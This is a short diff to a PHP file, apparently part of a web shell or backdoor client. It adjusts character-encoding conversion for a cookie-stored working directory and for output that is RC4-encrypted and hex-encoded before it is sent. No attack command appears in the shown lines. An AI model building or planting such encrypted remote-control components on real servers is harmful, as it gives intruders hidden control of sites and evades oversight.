@@ -98,6 +98,9 @@ if(!function_exists('get_cwd')){
 			setcookie("cwd", encode_cwd($cwd));
 		}else{
 			$cwd_c = rawurldecode(hex2bin($_COOKIE['cwd']));
+            if ((isset($GLOBALS['encode']) && $GLOBALS['encode'] != 'utf-8')) {
+                $cwd_c = convert_encode('utf-8', $GLOBALS['encode'], $cwd_c);
+            }
 			if(is_dir($cwd_c)) $cwd = realpath($cwd_c).DIRECTORY_SEPARATOR;
 			else setcookie("cwd", encode_cwd($cwd));
 		}
@@ -990,12 +993,12 @@ if(!function_exists('output')){
 	function output($str){
 		$error = @ob_get_contents();
 		@ob_end_clean();
-		header("Content-Type: text/plain; charset=UTF-8");
-		header("Cache-Control: no-cache");
-		header("Pragma: no-cache");
         if ((isset($GLOBALS['encode']) && $GLOBALS['encode'] != 'utf-8')) {
             $str = convert_encode($GLOBALS['encode'], 'utf-8', $str);
         }
+		header("Content-Type: text/plain; charset=utf-8");
+		header("Cache-Control: no-cache");
+		header("Pragma: no-cache");
 		echo bin2hex(rc4($GLOBALS['cipher_key'], $str));
 		die();
 	}
@@ -1051,5 +1054,11 @@ if(!function_exists('rc4')) {
 		}
 		return $res;
 	}
+}
+
+if(!function_exists('encodeURIComponent')) {
+    function encodeURIComponent($s) {
+        return strtr(rawurlencode($s), array());
+    }
 }
 ?>
